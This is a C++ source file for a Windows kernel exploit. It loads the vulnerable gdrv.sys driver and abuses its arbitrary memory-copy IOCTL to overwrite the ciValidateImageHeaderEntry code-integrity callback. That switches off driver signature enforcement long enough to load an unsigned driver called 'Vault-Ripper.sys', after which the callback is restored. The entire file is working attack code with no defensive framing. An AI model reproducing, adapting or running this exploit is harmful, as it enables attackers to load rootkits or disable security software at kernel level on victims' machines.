#include "includes.h"
#include "win_api_defs.h"



NTSTATUS vuln::TriggerExploit( _In_ PWSTR LoaderServiceName, _In_ PWSTR DriverServiceName ) {
    HANDLE DeviceHandle;
   
    NTSTATUS stat = modules::OpenDeviceHandle( &DeviceHandle, FALSE );
    std::wprintf( L"\n" );
    if ( !NT_SUCCESS( stat ) ) {
        stat = modules::LoadDriver( LoaderServiceName );
        if ( !NT_SUCCESS( stat ) ) return stat;

        wprintf( L"[+] Vuln (gdrv.sys) loaded successfully\n" );

        stat = modules::OpenDeviceHandle( &DeviceHandle, TRUE );
        if ( !NT_SUCCESS( stat ) || !DeviceHandle ) return stat;


        wprintf( L"[*] Device handle opened successfully: %p\n", DeviceHandle, LoaderServiceName );
    }

    seCiCallbacks_swap w = modules::get_CIValidate_ImageHeaderEntry();
    wprintf( L"[*] ciValidateImageHeaderEntry: %p\n", w.ciValidateImageHeaderEntry );
    wprintf( L"[*] zwFlushInstructionCache   : %p\n", w.zwFlushInstructionCache );

    // Read Original Callback 
    GIOMemcpyInput MemcpyInputR;
    IO_STATUS_BLOCK IoStatusBlockR;
    DWORD64 dataR = NULL;
    ULONG64 targetR = w.ciValidateImageHeaderEntry;

    MemcpyInputR.Src = targetR;
    MemcpyInputR.Dst = ( ULONG64 )&dataR;
    MemcpyInputR.Size = 8;

    RtlZeroMemory( &IoStatusBlockR, sizeof( IoStatusBlockR ) );
    stat = NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr,
        &IoStatusBlockR, IOCTL_GIO_MEMCPY, &MemcpyInputR, sizeof( MemcpyInputR ), nullptr, 0 );

    if ( !NT_SUCCESS( stat ) ) return stat;

    wprintf( L"[*] Original Callback : %p\n", dataR );

    //Overwrite Callback
    GIOMemcpyInput MemcpyInput;
    IO_STATUS_BLOCK IoStatusBlock;
    DWORD64 data = w.zwFlushInstructionCache;
    ULONG64 target = w.ciValidateImageHeaderEntry;

    MemcpyInput.Src = ( ULONG64 )&data;
    MemcpyInput.Dst = target;
    MemcpyInput.Size = 8;

    RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
    stat = NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr,
        &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );

    if ( !NT_SUCCESS( stat ) ) return stat;


    //Load Unsigned Driver 
    wprintf( L"[*] Attemping to load unsigned (Vault-Ripper.sys) driver...\n" );
    stat = modules::LoadDriver( DriverServiceName );
    if ( !NT_SUCCESS( stat ) ) return stat;
    
    // Make sure the vuln driver is still alive
    stat = modules::OpenDeviceHandle( &DeviceHandle, TRUE );
    if ( !NT_SUCCESS( stat ) ) return stat;


    // Restore Original Callback
    target = w.ciValidateImageHeaderEntry;
    MemcpyInput.Src = ( ULONG64 )&dataR;
    MemcpyInput.Dst = target;
    MemcpyInput.Size = 8;

    RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
    stat = NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr,
        &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );

    if ( !NT_SUCCESS( stat ) ) return stat;

    wprintf( L"[*] Restored callback\n" );
   
    NtClose( DeviceHandle );

    modules::UnloadDriver( LoaderServiceName );
    return stat;

}



NTSTATUS vuln::WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hidden )
{
	WCHAR LoaderPath[MAX_PATH] = { 0 };
	WCHAR DriverPath[MAX_PATH] = { 0 };

	constexpr ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;

	std::wprintf( L"[*] WindLoadDriver called\n" );

	// Priv Check
	NTSTATUS stat = RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled );
	std::wprintf( L"[*] RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE) -> %d\n", SeLoadDriverWasEnabled );
    if ( !NT_SUCCESS( stat ) ) return stat;

	// Expand full paths
	stat = RtlGetFullPathName_UEx( LoaderName, MAX_PATH * sizeof( WCHAR ), LoaderPath, nullptr, nullptr );
	if ( !NT_SUCCESS( stat ) ) return stat;

	stat = RtlGetFullPathName_UEx( DriverName, MAX_PATH * sizeof( WCHAR ), DriverPath, nullptr, nullptr );
    if ( !NT_SUCCESS( stat ) ) return stat;
	
	// Create loader driver service
	stat = modules::CreateDriverService( LoaderServiceName, LoaderPath );
    if ( !NT_SUCCESS( stat ) ) return stat;

	// Create target driver service
	stat = modules::CreateDriverService( DriverServiceName, DriverPath );
    if ( !NT_SUCCESS( stat ) ) return stat;
	
    // Trigger exploit
	std::wprintf( L"[+] Triggering exploit with:\n    Loader: %ls\n    Target: %ls\n", LoaderServiceName, DriverServiceName );
	vuln::TriggerExploit( LoaderServiceName, DriverServiceName );

	std::wprintf( L"[+] Done!\n" );
	return STATUS_SUCCESS;
}


NTSTATUS vuln::WindUnloadDriver(_In_ PWCHAR DriverName,_In_ BOOLEAN Hidden)
{
	constexpr CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	
	NTSTATUS stat = RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled );
	
	if ( !NT_SUCCESS( stat ) )	return stat;

	if ( DriverName != nullptr && Hidden )	modules::CreateDriverService( DriverServiceName, DriverName );

	helpers::FileNameToServiceName( DriverServiceName, DriverName );

	stat = modules::UnloadDriver( DriverServiceName );

	RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, SeLoadDriverWasEnabled, FALSE, &SeLoadDriverWasEnabled );

	return stat;
}